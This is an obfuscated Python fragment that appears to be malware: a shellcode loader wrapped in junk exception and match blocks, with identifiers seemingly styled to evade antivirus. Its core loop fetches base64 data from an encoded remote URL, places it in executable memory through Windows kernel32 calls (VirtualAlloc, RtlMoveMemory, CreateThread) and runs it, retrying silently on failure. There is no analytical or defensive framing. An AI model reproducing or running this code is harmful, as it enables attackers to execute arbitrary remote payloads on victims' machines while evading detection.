        __5084016566437 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '714' == '1810':
        case True:
            raise MemoryError([True])
        case False:
            _78 = [[True], [False]]
            R_E_D__A_V______(['_191'])
    raise MemoryError([True])
except MemoryError as _174:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _810: _810 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _48 = [[(lambda: (lambda _139: _139 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _612: _612 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _122: _122 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _148:
        try:
            raise MemoryError(__5084016566437)
        except MemoryError as __2415718597733:
            if __2415718597733.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __2415718597733.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6442065265081 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xcd:\xef(|U'))()
            if __2415718597733.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4847631554503 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xa6\xf4\xbdtE\x03'))()
            if __2415718597733.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4359593909368 = (lambda: R_E_D__A_V(b'R_E_D__A_V__F\x8f\x8c\xbc\x0e\xd8'))()
            if __2415718597733.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __4250273122325 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xac@\x8f\xfcvp'))()
            if __2415718597733.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __7581420205670 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x84\xd5v\xeb`\xa9'))()
try:
    match '82' == '179':
        case True:
            raise MemoryError([True])
        case False:
            _1017 = [[True], [False]]
            R_E_D__A_V______(['_176'])
    raise MemoryError([True])
except MemoryError as _42:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _54: _54 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _413 = [[(lambda: (lambda _59: _59 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _18: _18 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _813: _813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1017:
        while (lambda: (lambda _1710: _1710 + (lambda: ______R_E_D__A_V_______((lambda: R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyj'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyx'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyB'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyA'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyC'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda: R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue